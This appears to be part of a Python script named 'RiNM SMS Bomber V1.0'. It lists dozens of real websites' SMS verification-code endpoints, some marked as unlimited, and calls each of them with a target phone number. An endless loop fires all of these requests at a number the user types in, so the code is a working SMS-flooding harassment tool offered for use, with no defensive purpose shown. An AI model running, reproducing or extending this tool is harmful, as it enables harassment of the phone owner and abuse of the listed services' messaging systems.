    geturl('http://www.huway.com/register/sms?phone=' + mobile + '&_=1524631112552')
    # GET接口：人教通行证（无限）
    geturl('http://i.mypep.cn/ajax/phoneVcode?phone=' + mobile)
    # GET接口：史丹利家居（无限）
    geturl('http://mall.stanleycloset.com/ajax/common.ashx?action=send_tels&tel=' + mobile)
    # GET接口：一起购（无限）
    geturl('http://ktyqg.com/user/vcode/index?act=reg&phone=' + mobile + '&t=1523448434888')
    # GET接口：红岭（无限）
    geturl('http://www.hljfpz.com/Register/send.html?_t=0.6810571874332301&mobile=' + mobile)
    # POST接口：盟享加（无限）
    posturl('http://www.mxj.com.cn/login/getVerifyCode', 'mobile=' + mobile)
    # POST接口：928发卡网
    posturl('http://www.928fk.com/index/login/send_register_sms', 'phone=' + mobile)
    # POST接口：卡奥网（无限）
    posturl('http://www.admin333.com/QuicklyRegister.html', 'mobile=' + mobile + '&submitButton=sendcode')
    # POST接口：星星生活（无限）
    posturl('http://new.czxshop.com/wap/cash-send.html', 'mobile=' + mobile)
    # POST接口：币缘（无限）
    posturl('http://ico.8qcion.com/Phone/User/sendcode', 'mobile=' + mobile)
    # POST接口：热文文（无限）
    posturl('http://www.rewenwen.com/mport.php', 'phone=' + mobile + '&action=send_vertify_code&type=login_phone&')
    # POST接口：千相魔方（无限）
    posturl('http://ai.dearjie.com/RegisterAshx/GetPhoneVerCode.ashx', 'phone=' + mobile)
    # POST接口：邵阳新闻网（无限）
    posturl('http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage', 'mobile=' + mobile)
    # GET接口：硅谷智能（无限）
    geturl('http://www.guiji.ai/site/sms?type=2&mobile=' + mobile)
    # GET接口：51竞拍
    geturl('http://s.yyqg8.com/detection?identifier=' + mobile + '&loginType=TELEPHONE')
    # GET接口：赚钱宝
    geturl(
        'http://ws.wlwch.cn/portal/redpackAccount/phoneVerifyCode?phoneNum=' + mobile + '&token=ePZrWgHZmbuBfrWoWueHqKKFqfinACPs')
    # GET接口：拼拼购
    geturl('http://yyg.txapp.cn/login/send_captcha?mobile=' + mobile + '&type=1')
    # GET接口：极速拍卖
    geturl(
        'http://pm.yz314.com//index.php/index/Member/getVcode?phone=' + mobile + '&type=Register&extra=&_=1528623341870')
    # GET接口：连飞电竞
    geturl('http://api.lflyes.com/esport-api/v1/user/send_sms?type=1&phone=' + mobile)
    # POST接口：趣回购
    posturl('http://api.quhgo.com/sms/getSmsCode', 'userPhone=' + mobile)
    # POST接口：寺库网
    posturl('https://user-center.secoo.com/service/appapi/user/msg/send', 'bid=9&mobile=' + mobile)
    # POST接口：省钱拍卖
    posturl('http://api.yiysp.com/api/sms/send',
            'mobile=' + mobile + '&sign=cc3cb3119511d941c00ba01bdc143d3d&event=register')
    # POST接口：拍医拍
    posturl('http://pypapi.vgeili.cn/apiv1_code/authcode',
            'phone=' + mobile + '&reqmode=1&tms=1&did=36a8d9d8d2a6212d43e47c5c948077c2')
def go():
    print(str(myip))
    gethz()
    print(str(myip))
    posthz()
    print(str(myip))
    wuxian()
    print(str(myip))

t = threading.Thread(target=dnsprefetch)
t.start()

print(' Welcome to use RiNM SMS Bomber V1.0')
mobile = 'NULL'
while mobile.isdigit() == False:
    mobile = input(' Please enter mobile number:')
    print(' Your IP Address is: ' + str(myip))
    while True:
        wuxian()
        print(str(myip))
        go()



